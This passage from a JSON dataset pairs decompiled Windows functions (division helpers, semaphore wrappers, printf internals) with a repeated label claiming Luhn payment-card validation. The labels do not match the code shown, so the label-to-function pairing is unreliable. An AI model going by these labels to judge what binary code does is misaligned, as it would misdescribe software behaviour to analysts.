        "decompiled_code": "\nuint64_t fcn.00437f00(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    if (param_4 == 0) {\n        if (param_3 <= param_2) {\n            if (param_3 == 0) {\n                param_3 = 1 / 0;\n            }\n            return (param_2 % param_3 << 0x20 | param_1) / param_3 & 0xffffffff | param_2 / param_3 << 0x20;\n        }\n        uVar9 = 0;\n        iVar6 = CONCAT44(param_2, param_1) / param_3;\n    }\n    else {\n        if (param_2 < param_4) {\n            return 0;\n        }\n        uVar9 = 0x1f;\n        if (param_4 != 0) {\n            for (; param_4 >> uVar9 == 0; uVar9 = uVar9 - 1) {\n            }\n        }\n        uVar9 = uVar9 ^ 0x1f;\n        if (uVar9 == 0) {\n            if ((param_4 < param_2) || (iVar6 = 0,  param_3 <= param_1)) {\n                iVar6 = 1;\n            }\n        }\n        else {\n            uVar5 = uVar9;\n            uVar7 = 0x20 - uVar5;\n            uVar1 = param_4 << (uVar5 & 0x1f) | param_3 >> (uVar7 & 0x1f);\n            uVar2 = CONCAT44(param_2 >> (uVar7 & 0x1f), param_2 << (uVar5 & 0x1f) | param_1 >> (uVar7 & 0x1f));\n            uVar3 = uVar2 / uVar1;\n            iVar6 = uVar3;\n            uVar9 = uVar2 % uVar1;\n            iVar4 = (uVar3 & 0xffffffff) * (param_3 << (uVar5 & 0x1f));\n            uVar8 = iVar4 >> 0x20;\n            if ((uVar9 < uVar8) || ((param_1 << (uVar5 & 0x1f) < iVar4 && (uVar9 == uVar8)))) {\n                iVar6 = iVar6 + -1;\n                uVar9 = 0;\n            }\n            else {\n                uVar9 = 0;\n            }\n        }\n    }\n    return CONCAT44(uVar9, iVar6);\n}\n",
        "token_count": 654
    },
    "00438000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00438000(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    \n    if (param_4 == 0) {\n        if (param_2 < param_3) {\n            uVar6 = CONCAT44(param_2, param_1) % param_3;\n        }\n        else {\n            if (param_3 == 0) {\n                param_3 = 1 / 0;\n            }\n            uVar6 = (param_2 % param_3 << 0x20 | param_1) % param_3;\n        }\n        return uVar6;\n    }\n    if (param_4 <= param_2) {\n        uVar6 = 0x1f;\n        if (param_4 != 0) {\n            for (; param_4 >> uVar6 == 0; uVar6 = uVar6 - 1) {\n            }\n        }\n        if ((uVar6 ^ 0x1f) != 0) {\n            uVar3 = uVar6 ^ 0x1f;\n            uVar4 = 0x20 - uVar3;\n            uVar5 = param_4 << (uVar3 & 0x1f) | param_3 >> (uVar4 & 0x1f);\n            param_3 = param_3 << (uVar3 & 0x1f);\n            uVar9 = param_1 << (uVar3 & 0x1f);\n            uVar1 = CONCAT44(param_2 >> (uVar4 & 0x1f), param_1 >> (uVar4 & 0x1f) | param_2 << (uVar3 & 0x1f));\n            uVar7 = uVar1 % uVar5;\n            iVar2 = (uVar1 / uVar5 & 0xffffffff) * param_3;\n            uVar8 = iVar2 >> 0x20;\n            uVar6 = iVar2;\n            if ((uVar7 < uVar8) || ((uVar7 == uVar8 && (uVar9 < uVar6)))) {\n                bVar10 = uVar6 < param_3;\n                uVar6 = uVar6 - param_3;\n                uVar8 = (uVar8 - uVar5) - bVar10;\n            }\n            uVar5 = (uVar7 - uVar8) - (uVar9 < uVar6);\n            return CONCAT44(uVar5 >> (uVar3 & 0x1f), uVar5 << (uVar4 & 0x1f) | uVar9 - uVar6 >> (uVar3 & 0x1f));\n        }\n        if ((param_4 < param_2) || (param_3 <= param_1)) {\n            bVar10 = param_1 < param_3;\n            param_1 = param_1 - param_3;\n            param_2 = (param_2 - param_4) - bVar10;\n        }\n        return CONCAT44(param_2, param_1);\n    }\n    return CONCAT44(param_2, param_1);\n}\n",
        "token_count": 777
    },
    "00438280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00438280(uint *param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0xffffffff;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    param_1[1] = uVar1;\n    return;\n}\n",
        "token_count": 77
    },
    "00438340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00438340(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    LOCK();\n    iVar1 = *param_1;\n    *param_1 = *param_1 + -1;\n    if (iVar1 + -1 < 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(param_1[1], 1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 106
    },
    "00438390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00438390(uint *param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0xffffffff;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    param_1[3] = uVar1;\n    return;\n}\n",
        "token_count": 99
    },
    "004384b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.004384b0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = param_1[1];\n    param_1[1] = iVar1 + -1;\n    if (iVar1 + -1 == 0) {\n        param_1[2] = 0;\n        LOCK();\n        iVar1 = *param_1;\n        *param_1 = *param_1 + -1;\n        if (-1 < iVar1 + -1) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(param_1[3], 1, 0);\n            return iVar1 == 0;\n        }\n    }\n    return false;\n}\n",
        "token_count": 156
    },
    "0043aaf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043aaf0(int32_t param_1, code *param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint *puVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    \n    iVar4 = param_3 * 2;\n    while( true ) {\n        iVar5 = iVar4 + 1;\n        if (param_4 <= iVar5) {\n            return;\n        }\n        puVar6 = param_1 + iVar5 * 4;\n        uVar3 = *puVar6;\n        if (iVar4 + 2 < param_4) {\n            puVar1 = param_1 + 4 + iVar5 * 4;\n            iVar2 = (*param_2)(in_EAX, uVar3, *puVar1);\n            if (iVar2 < 0) {\n                uVar3 = *puVar1;\n                iVar5 = iVar4 + 2;\n                puVar6 = puVar1;\n            }\n            else {\n                uVar3 = *puVar6;\n            }\n        }\n        puVar1 = param_1 + param_3 * 4;\n        iVar4 = (*param_2)(in_EAX, *puVar1, uVar3);\n        if (-1 < iVar4) break;\n        uVar3 = *puVar1;\n        *puVar1 = *puVar6;\n        iVar4 = iVar5 * 2;\n        *puVar6 = uVar3;\n        param_3 = iVar5;\n    }\n    return;\n}\n",
        "token_count": 371
    },
    "0043ac50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043ac50(void)\n\n{\n    *0x56b40c = 0xffffffff;\n    *0x56b410 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    return;\n}\n",
        "token_count": 61
    },
    "0043b350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0043b350(void)\n\n{\n    int32_t iVar1;\n    uint32_t uStack36;\n    uint32_t auStack32 [4];\n    \n    fcn.0043aed0();\n    fcn.0043ace0();\n    fcn.0043ad20(&uStack36);\n    fcn.0043aed0();\n    fcn.0043ace0();\n    fcn.0043ad20(auStack32);\n    iVar1 = 1;\n    if (uStack36 <= auStack32[0]) {\n        iVar1 = -(uStack36 < auStack32[0]);\n    }\n    return iVar1;\n}\n",
        "token_count": 146
    },
    "0043c300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0043c300(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t *in_EAX;\n    int32_t iVar5;\n    \n    uVar4 = in_EAX[1];\n    iVar2 = *in_EAX;\n    if (uVar4 < 5) {\n        iVar5 = sub.msvcrt.dll_malloc(iVar2 + 4);\n        if (iVar5 == 0) {\ncode_r0x004014e0:\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n            if (iVar2 == 0) {\n                *0x4ce004 = 0x43c000;\n                pcVar3 = 0x43bdb0;\n            }\n            else {\n                *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"__register_frame_info\");\n                *0x4ce004 = (*pcVar1)(iVar2, \"__deregister_frame_info\");\n            }\n            if (pcVar3 != NULL) {\n                (*pcVar3)(0x52e0f8, 0x56b01c);\n            }\n            uVar4 = fcn.004014c0(fcn.00401590);\n            return uVar4;\n        }\n        *iVar5 = iVar5;\n        uVar4 = iVar5 + 4;\n        iVar5 = in_EAX[3];\n    }\n    else {\n        iVar5 = sub.msvcrt.dll_malloc(uVar4 + 3 + iVar2);\n        if (iVar5 == 0) goto code_r0x004014e0;\n        uVar4 = iVar5 + 3 + uVar4 & -uVar4;\n        *(uVar4 - 4) = iVar5;\n        iVar5 = in_EAX[3];\n    }\n    if (iVar5 != 0) {\n        sub.msvcrt.dll_memcpy(uVar4, iVar5);\n        return uVar4;\n    }\n    sub.msvcrt.dll_memset(uVar4, 0, iVar2);\n    return uVar4;\n}\n",
        "token_count": 549
    },
    "0043d5f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0043d5f0(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uStack24;\n    uint uStack20;\n    ushort uStack16;\n    ushort uStack14;\n    \n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack14 = 0;\n    iVar1 = fcn.0043cc40(param_1, &uStack24);\n    if (param_2 != NULL) {\n        *param_2 = param_1 + iVar1;\n    }\n    return CONCAT28(uStack16, CONCAT44(uStack20, uStack24));\n}\n",
        "token_count": 157
    },
    "0043d640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0043d640(uchar *param_1, uint16_t param_2, int32_t param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint16_t auStack32 [8];\n    int32_t aiStack16 [4];\n    \n    auStack32[0] = param_2;\n    if (param_3 == 0) {\n        if (0xff < param_2) {\ncode_r0x0043d6c8:\n            puVar2 = sub.msvcrt.dll__errno();\n            *puVar2 = 0x2a;\n            return -1;\n        }\n        *param_1 = param_2;\n        iVar1 = 1;\n    }\n    else {\n        aiStack16[0] = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(param_3, 0, auStack32, 1, param_1, param_4, 0, aiStack16);\n        if ((iVar1 == 0) || (aiStack16[0] != 0)) goto code_r0x0043d6c8;\n    }\n    return iVar1;\n}\n",
        "token_count": 272
    },
    "0043d6e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043d6e0(uchar *param_1, ushort param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uchar auStack17 [5];\n    \n    if (param_1 == NULL) {\n        param_1 = auStack17;\n    }\n    uVar1 = sub.msvcrt.dll____mb_cur_max_func();\n    uVar2 = fcn.00447090();\n    fcn.0043d640(param_1, param_2, uVar2, uVar1);\n    return;\n}\n",
        "token_count": 122
    },
    "0043d840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0043d840(ushort param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    uchar uStack19;\n    ushort uStack18;\n    uint auStack16 [4];\n    \n    auStack16[0] = 0;\n    uStack18 = param_1;\n    uVar1 = fcn.00447090();\n    iVar4 = 1;\n    puVar3 = &uStack18;\n    iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar1, 0, puVar3, 1, &uStack19, 1, 0, auStack16);\n    if ((iVar2 == 0) || (iVar4 != 0)) {\n        iVar2 = -1;\n    }\n    else {\n        iVar2 = puVar3 >> 8;\n    }\n    return iVar2;\n}\n",
        "token_count": 212
    },
    "0043d8c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.0043d8c0(uint param_1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    pcVar1 = \"alnum\";\n    iVar3 = 0;\n    while( true ) {\n        iVar2 = sub.msvcrt.dll_strcmp(param_1, pcVar1);\n        if (iVar2 == 0) {\n            return *(iVar3 * 8 + 0x5273a4);\n        }\n        iVar3 = iVar3 + 1;\n        if (iVar3 == 0xb) break;\n        pcVar1 = *(iVar3 * 8 + 0x5273a0);\n    }\n    return 0;\n}\n",
        "token_count": 157
    },
    "0043df30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043df30(int32_t param_1, int32_t param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    \n    if (param_2 != 0) {\n        param_2 = param_2 + -1;\n        iVar1 = fcn.00442d30(0, param_1, param_2, param_3, param_4);\n        if (iVar1 < param_2) {\n            param_2 = iVar1;\n        }\n        *(param_1 + param_2) = 0;\n        return;\n    }\n    fcn.00442d30(0, param_1, 0, param_3, param_4);\n    return;\n}\n",
        "token_count": 165
    },
    "00441540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441540(uint param_1, int32_t *param_2)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    \n    if (((param_2[1] & 0x4000U) != 0) || (iVar1 = param_2[8],  param_2[9] != iVar1 && iVar1 <= param_2[9])) {\n        if ((param_2[1] & 0x2000U) != 0) {\n            sub.msvcrt.dll_fputc();\n            param_2[8] = param_2[8] + 1;\n            return;\n        }\n        *(*param_2 + param_2[8]) = in_AL;\n        iVar1 = param_2[8];\n    }\n    param_2[8] = iVar1 + 1;\n    return;\n}\n",
        "token_count": 190
    },
    "004415a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004415a0(int32_t param_1, int32_t param_2)\n\n{\n    ushort *in_EAX;\n    int32_t iVar1;\n    uchar *puVar2;\n    ushort *puStack68;\n    int32_t iStack64;\n    uchar auStack48 [4];\n    uchar auStack44 [28];\n    \n    fcn.0043d6e0(auStack44, 0, auStack48);\n    iStack64 = *(param_1 + 0xc);\n    if ((param_2 <= iStack64) || (iStack64 < 0)) {\n        iStack64 = param_2;\n    }\n    puStack68 = in_EAX;\n    if (iStack64 < *(param_1 + 8)) {\n        iVar1 = *(param_1 + 8) - iStack64;\n        *(param_1 + 8) = iVar1;\n        if ((*(param_1 + 5) & 4) == 0) {\n            *(param_1 + 8) = iVar1 + -1;\n            do {\n                fcn.00441540();\n                iVar1 = *(param_1 + 8);\n                *(param_1 + 8) = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    else {\n        *(param_1 + 8) = 0xffffffff;\n    }\n    for (; 0 < iStack64; iStack64 = iStack64 + -1) {\n        iVar1 = fcn.0043d6e0(auStack44, *puStack68, auStack48);\n        if (iVar1 < 1) break;\n        puVar2 = auStack44;\n        do {\n            puVar2 = puVar2 + 1;\n            fcn.00441540();\n        } while (puVar2 != auStack44 + iVar1);\n        puStack68 = puStack68 + 1;\n    }\n    while (iVar1 = *(param_1 + 8),  *(param_1 + 8) = iVar1 + -1,  0 < iVar1) {\n        fcn.00441540();\n    }\n    return;\n}\n",
        "token_count": 483
    },
    "004416c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004416c0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + 0xc);\n    if ((param_2 <= iVar2) || (iVar2 < 0)) {\n        iVar2 = param_2;\n    }\n    if (iVar2 < *(param_1 + 8)) {\n        iVar1 = *(param_1 + 8) - iVar2;\n        *(param_1 + 8) = iVar1;\n        if ((*(param_1 + 5) & 4) == 0) {\n            *(param_1 + 8) = iVar1 + -1;\n            do {\n                fcn.00441540();\n                iVar1 = *(param_1 + 8);\n                *(param_1 + 8) = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        if (iVar2 == 0) goto code_r0x0044171d;\n    }\n    else {\n        *(param_1 + 8) = 0xffffffff;\n        if (iVar2 == 0) {\n            *(param_1 + 8) = 0xfffffffe;\n            return;\n        }\n    }\n    iVar2 = iVar2 + in_EAX;\n    do {\n        in_EAX = in_EAX + 1;\n        fcn.00441540();\n    } while (in_EAX != iVar2);\n    iVar2 = *(param_1 + 8);\n    *(param_1 + 8) = iVar2 + -1;\n    while (0 < iVar2) {\n        fcn.00441540();\ncode_r0x0044171d:\n        iVar2 = *(param_1 + 8);\n        *(param_1 + 8) = iVar2 + -1;\n    }\n    return;\n}\n",
        "token_count": 425
    },
    "00441780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441780(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    int32_t iVar2;\n    \n    if (in_EAX == 0) {\n        in_EAX = 0x5276e0;\n    }\n    if (*(param_2 + 0xc) < 0) {\n        iVar1 = sub.msvcrt.dll_strlen(in_EAX);\n    }\n    else {\n        iVar1 = fcn.00446ce0(in_EAX, *(param_2 + 0xc));\n    }\n    iVar2 = *(param_2 + 0xc);\n    if ((iVar1 <= iVar2) || (iVar2 < 0)) {\n        iVar2 = iVar1;\n    }\n    if (iVar2 < *(param_2 + 8)) {\n        iVar1 = *(param_2 + 8) - iVar2;\n        *(param_2 + 8) = iVar1;\n        if ((*(param_2 + 5) & 4) == 0) {\n            *(param_2 + 8) = iVar1 + -1;\n            do {\n                fcn.00441540(unaff_EBX, unaff_ESI);\n                iVar1 = *(param_2 + 8);\n                *(param_2 + 8) = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        if (iVar2 == 0) goto code_r0x0044171d;\n    }\n    else {\n        *(param_2 + 8) = 0xffffffff;\n        if (iVar2 == 0) {\n            *(param_2 + 8) = 0xfffffffe;\n            return;\n        }\n    }\n    iVar2 = iVar2 + in_EAX;\n    do {\n        in_EAX = in_EAX + 1;\n        fcn.00441540(unaff_EBX, unaff_ESI);\n    } while (in_EAX != iVar2);\n    iVar1 = *(param_2 + 8);\n    *(param_2 + 8) = iVar1 + -1;\n    while (0 < iVar1) {\n        fcn.00441540(unaff_EBX, unaff_ESI);\ncode_r0x0044171d:\n        iVar1 = *(param_2 + 8);\n        *(param_2 + 8) = iVar1 + -1;\n    }\n    return;\n}\n",
        "token_count": 548
    },
    "00441880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00441880(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    ulong uVar6;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_bp_ch;\n    uint uStack80;\n    uchar *apuStack76 [2];\n    int32_t iStack68;\n    uint *puStack64;\n    uchar auStack60 [12];\n    uchar *var_2ch_2;\n    int16_t var_1eh_2;\n    uint var_1ch_2;\n    \n    var_2ch_2 = &stack0xffffffb4;\n    if (*(in_EAX + 0x10) == -3) {\n        var_1ch_2 = 0;\n        uStack80 = 0x441910;\n        puVar3 = sub.msvcrt.dll_localeconv();\n        puStack64 = &fcn.00441880::var_1ch_2;\n        iStack68 = 0x10;\n        apuStack76[1] = *puVar3;\n        apuStack76[0] = &stack0xffffffde;\n        uStack80 = 0x441930;\n        iVar4 = fcn.0043ca70();\n        if (iVar4 < 1) {\n            var_1eh_2 = *(in_EAX + 0x14);\n        }\n        else {\n            *(in_EAX + 0x14) = var_1eh_2;\n        }\n        *(in_EAX + 0x10) = iVar4;\n    }\n    else {\n        var_1eh_2 = *(in_EAX + 0x14);\n    }\n    if (var_1eh_2 == 0) {\n        uStack80 = 0x4418fc;\n        fcn.00441540();\n        return;\n    }\n    uStack80 = 0x4418ab;\n    uVar6 = fcn.00437ed0();\n    iVar4 = -uVar6;\n    var_1ch_2 = 0;\n    puVar5 = &stack0xffffffc4 + iVar4;\n    *(&stack0xffffffb8 + iVar4) = uVar6 >> 0x20;\n    *(&stack0xffffffbc + iVar4) = &fcn.00441880::var_1ch_2;\n    *(&stack0xffffffb4 + iVar4) = puVar5;\n    *(&stack0xffffffb0 + iVar4) = 0x4418cb;\n    iVar2 = fcn.0043d6e0();\n    if (iVar2 < 1) {\n        *(&stack0xffffffb0 + iVar4) = 0x441950;\n        fcn.00441540();\n    }\n    else {\n        puVar1 = puVar5 + iVar2;\n        do {\n            puVar5 = puVar5 + 1;\n            *(&stack0xffffffb0 + iVar4) = 0x4418e0;\n            fcn.00441540();\n        } while (puVar5 != puVar1);\n    }\n    return;\n}\n",
        "token_count": 718
    },
    "00441cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00441cd0(unkbyte10 param_1)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iStack32;\n    uint uStack28;\n    uint uStack24;\n    ushort uStack20;\n    ushort uStack18;\n    \n    if (*(in_EAX + 0xc) < 0) {\n        *(in_EAX + 0xc) = 6;\n    }\n    uStack28 = param_1;\n    uStack24 = param_1 >> 0x20;\n    uStack20 = param_1 >> 0x40;\n    uVar2 = fcn.00441440(uStack28, uStack24, CONCAT22(uStack18, uStack20));\n    if (iStack32 != -0x8000) {\n        fcn.00441960();\n        while (iVar1 = *(in_EAX + 8),  *(in_EAX + 8) = iVar1 + -1,  0 < iVar1) {\n            fcn.00441540();\n        }\n        fcn.004436f0(uVar2);\n        return;\n    }\n    fcn.004417e0();\n    fcn.004436f0(uVar2);\n    return;\n}\n",
        "token_count": 282
    },
    "00442180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00442180(unkbyte10 param_1)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iStack32;\n    uint uStack28;\n    uint uStack24;\n    ushort uStack20;\n    ushort uStack18;\n    \n    if (*(in_EAX + 0xc) < 0) {\n        *(in_EAX + 0xc) = 6;\n    }\n    uStack28 = param_1;\n    uStack24 = param_1 >> 0x20;\n    uStack20 = param_1 >> 0x40;\n    uVar1 = fcn.00441440(uStack28, uStack24, CONCAT22(uStack18, uStack20));\n    if (iStack32 == -0x8000) {\n        fcn.004417e0();\n        fcn.004436f0(uVar1);\n        return;\n    }\n    fcn.004420a0();\n    fcn.004436f0(uVar1);\n    return;\n}\n",
        "token_count": 227
    },
    "00442230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00442230(unkbyte10 param_1)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uint uStack24;\n    ushort uStack20;\n    ushort uStack18;\n    \n    if (*(in_EAX + 0xc) < 0) {\n        *(in_EAX + 0xc) = 6;\n    }\n    else if (*(in_EAX + 0xc) == 0) {\n        *(in_EAX + 0xc) = 1;\n    }\n    uStack28 = param_1;\n    uStack24 = param_1 >> 0x20;\n    uStack20 = param_1 >> 0x40;\n    uVar1 = fcn.00441440(uStack28, uStack24, CONCAT22(uStack18, uStack20));\n    if (iStack32 != -0x8000) {\n        uVar2 = *(in_EAX + 4) & 0x800;\n        if ((-4 < iStack32) && (iStack32 <= *(in_EAX + 0xc))) {\n            if (uVar2 == 0) {\n                iVar3 = sub.msvcrt.dll_strlen(uVar1);\n                iVar3 = iVar3 - iStack32;\n                *(in_EAX + 0xc) = iVar3;\n                if ((iVar3 < 0) && (0 < *(in_EAX + 8))) {\n                    *(in_EAX + 8) = iVar3 + *(in_EAX + 8);\n                }\n            }\n            else {\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) - iStack32;\n            }\n            fcn.00441960();\n            while (iVar3 = *(in_EAX + 8),  *(in_EAX + 8) = iVar3 + -1,  0 < iVar3) {\n                fcn.00441540();\n            }\n            fcn.004436f0(uVar1);\n            return;\n        }\n        if (uVar2 == 0) {\n            iVar3 = sub.msvcrt.dll_strlen(uVar1);\n            *(in_EAX + 0xc) = iVar3 + -1;\n        }\n        else {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n        }\n        fcn.004420a0();\n        fcn.004436f0(uVar1);\n        return;\n    }\n    fcn.004417e0();\n    fcn.004436f0(uVar1);\n    return;\n}\n",
        "token_count": 593
    },
    "00443630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00443630(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (0x13 < param_1) {\n        iVar1 = 4;\n        do {\n            iVar1 = iVar1 * 2;\n            iVar3 = iVar3 + 1;\n        } while (iVar1 + 0xf < param_1);\n    }\n    piVar2 = fcn.00445f30(iVar3);\n    *piVar2 = iVar3;\n    return piVar2 + 1;\n}\n",
        "token_count": 144
    },
    "00443670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00443670(char *param_1, int32_t **param_2, int32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    \n    if (param_3 < 0x14) {\n        iVar5 = 0;\n    }\n    else {\n        iVar2 = 4;\n        iVar5 = 0;\n        do {\n            iVar2 = iVar2 * 2;\n            iVar5 = iVar5 + 1;\n        } while (iVar2 + 0xf < param_3);\n    }\n    piVar3 = fcn.00445f30(iVar5);\n    *piVar3 = iVar5;\n    cVar1 = *param_1;\n    *(piVar3 + 1) = cVar1;\n    piVar4 = piVar3 + 1;\n    while (cVar1 != '\\0') {\n        param_1 = param_1 + 1;\n        cVar1 = *param_1;\n        piVar4 = piVar4 + 1;\n        *piVar4 = cVar1;\n    }\n    if (param_2 != NULL) {\n        *param_2 = piVar4;\n    }\n    return piVar3 + 1;\n}\n",
        "token_count": 301
    },
    "004459c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
